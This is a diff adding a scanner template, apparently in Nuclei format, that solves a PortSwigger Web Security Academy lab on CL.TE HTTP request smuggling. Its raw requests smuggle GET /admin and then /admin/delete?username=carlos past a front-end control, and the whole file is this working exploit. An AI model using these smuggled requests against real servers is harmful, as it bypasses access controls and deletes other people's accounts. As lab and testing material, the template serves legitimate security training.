@@ -1,0 +1,65 @@
+# To solve this > U need to refresh apge and go to GET https://ID-LAB.web-security-academy.net/admin
+
+id: smuggling-bypass-front-end-controls-cl-te
+
+info:
+  name: HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+  author: pdteam
+  severity: info
+  reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te
+
+http:
+  - raw:
+    - |+
+      POST / HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 116
+      Transfer-Encoding: chunked
+      
+      0
+      
+      GET /admin HTTP/1.1
+      Host: localhost
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 10
+      
+      x=
+      
+    - |+
+      POST / HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 116
+      Transfer-Encoding: chunked
+      
+      0
+      
+      GET /admin HTTP/1.1
+      Host: localhost
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 10
+      
+      x=
+
+    - |+
+      POST / HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 139
+      Transfer-Encoding: chunked
+
+      0
+
+      GET /admin/delete?username=carlos HTTP/1.1
+      Host: localhost
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 10
+
+      x=  
+      
+    unsafe: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "/admin/delete?username=carlos")'
